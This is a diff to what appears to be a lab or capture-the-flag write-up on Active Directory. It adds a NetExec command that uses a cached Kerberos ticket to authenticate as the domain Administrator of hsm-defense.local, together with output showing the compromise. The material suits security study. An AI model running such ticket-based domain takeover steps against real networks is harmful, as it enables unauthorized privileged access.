@@ -836,5 +836,15 @@ Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies
 
 Now i can request the ticket for the administrator using the `helpdesk01$` found earlier
 
+```python
+nxc smb dc.hsm-defense.local --use-kcache                          
+SMB         dc.hsm-defense.local 445    dc               [*]  x64 (name:dc) (domain:hsm-defense.local) (signing:True) (SMBv1:None) (NTLM:False)
+SMB         dc.hsm-defense.local 445    dc               [+] hsm-defense.local\Administrator from ccache (Pwn3d!)
+```
 
+I can now authenticate as the domain admin
+
+```python
+
+```
 
